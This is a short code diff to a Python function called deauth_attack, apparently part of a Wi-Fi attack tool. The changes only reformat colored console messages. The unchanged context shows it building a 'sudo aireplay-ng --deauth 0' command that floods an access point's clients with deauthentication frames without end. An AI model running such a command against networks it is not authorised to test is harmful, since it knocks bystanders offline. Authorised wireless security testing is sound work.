@@ -34,12 +34,12 @@ def deauth_attack(interface, ap, target=None, duration=10):
             print(colored(f"[!] Cannot verify if interface {interface} exists. Continuing anyway...", 'yellow'))
             
         print(colored(f"\n[+] Starting deauth attack for {duration} seconds on:", 'yellow'))
-        print(colored(f" Access Point: {ap}", 'cyan'))
+        print(colored(" Access Point:","cyan"),ap)
         if target:
-            print(colored(f" Target Client: {target}", 'cyan'))
+            print(colored("Target Client:", "cyan"), target)
         else:
-            print(colored(f" Target: All connected clients", 'cyan'))
-        print(colored(f" Interface: {interface}", 'cyan'))
+            print(colored(" Target:", "cyan")+ " All connected clients")
+        print(colored(" Interface:","cyan"), interface)
         
         cmd = ["sudo", "aireplay-ng", "--ignore-negative-one", "--deauth", "0", "-a", ap]
         
